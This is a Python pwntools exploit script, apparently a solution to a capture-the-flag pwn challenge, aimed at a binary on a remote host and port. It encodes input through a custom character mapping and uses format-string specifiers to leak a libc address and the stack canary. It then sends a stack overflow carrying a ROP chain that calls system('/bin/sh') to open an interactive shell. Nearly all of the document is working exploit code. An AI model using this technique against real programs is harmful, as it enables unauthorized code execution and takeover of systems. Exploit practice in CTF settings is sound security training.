#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.87.66.171', 61009

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x14aa
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def shenanigans(s: str) -> bytes:
    result = bytearray()
    for c in s:
        oc = ord(c)
        if 'a' <= c <= 'z':
            result.append((oc - ord('a')) + 0x57)
        elif 'A' <= c <= 'Z':
            result.append((oc - ord('A')) + 0x3b)
        else:
            # This char is not transformed, so just send it directly
            result.append(oc)
    return bytes(result)

def exploit():
    global io
    io = initialize()

    # payload = shenanigans('|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p')
    # io.sendlineafter(b':', payload)

    payload = shenanigans('|%3$p|%25$p|')
    io.sendlineafter(b':', payload)

    io.recvuntil(b'|')
    libc.address = int(io.recvuntil(b'|', drop=True).strip(), 16) - 0x114887
    canary = int(io.recvuntil(b'|', drop=True).strip(), 16)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    payload = flat({
        0x88: [
            canary,
            0x0,
            pop_rdi,
            next(libc.search(b'/bin/sh')),
            ret,
            libc.symbols['system'],
        ]
    })
    io.sendlineafter(b':', payload)


    log.info("libc base: %#x", libc.address)
    log.info("canary: %#x", canary)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
